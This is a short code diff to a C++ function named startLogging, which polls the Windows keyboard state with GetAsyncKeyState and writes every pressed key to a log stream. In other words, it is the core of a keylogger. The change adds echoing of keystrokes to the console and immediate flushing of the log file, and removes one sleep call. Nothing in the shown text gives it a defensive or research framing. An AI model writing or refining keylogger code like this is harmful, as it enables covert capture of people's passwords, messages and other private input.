@@ -34,11 +34,12 @@ void startLogging(){
     while(true){
         for (int i = 0x08; i <= 0xFE; i++){
             if (GetAsyncKeyState(i) & 0x8000) {
+                std::cout << char(i);
                 logg << char(i);
+                logg.flush();
                 Sleep(100);
             }
         }
-        Sleep(100);
     }
 }
 
